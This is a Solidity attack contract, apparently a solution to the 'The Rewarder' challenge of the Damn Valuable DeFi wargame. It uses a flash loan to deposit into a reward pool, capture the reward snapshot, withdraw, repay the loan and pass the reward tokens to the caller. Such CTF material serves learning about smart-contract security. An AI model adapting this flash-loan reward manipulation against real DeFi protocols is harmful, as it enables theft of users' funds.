// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract AttackTheRewarder {
    FlashLoanerPool pool;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool rewardPool;

    constructor(
        address poolAddress,
        address liquidityTokenAddress,
        address rewardPoolAddress
    ) {
        pool = FlashLoanerPool(poolAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardPool = TheRewarderPool(rewardPoolAddress);
    }

    function attack(uint256 amount) public {
        // Initiate flash loan and trigger receiveFlashLoan() 
        pool.flashLoan(amount);

        // Transfer fund to attacker
        uint256 attReward = rewardPool.rewardToken().balanceOf(address(this));
        rewardPool.rewardToken().transfer(msg.sender, attReward);
    }

    function receiveFlashLoan(uint256 amount) public {
        // Approve reward pool to spend our fund
        liquidityToken.approve(address(rewardPool), amount);
        
        // Deposit loans and withdraw reward
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        // Return loan
        liquidityToken.transfer(address(pool), amount);

    }
}

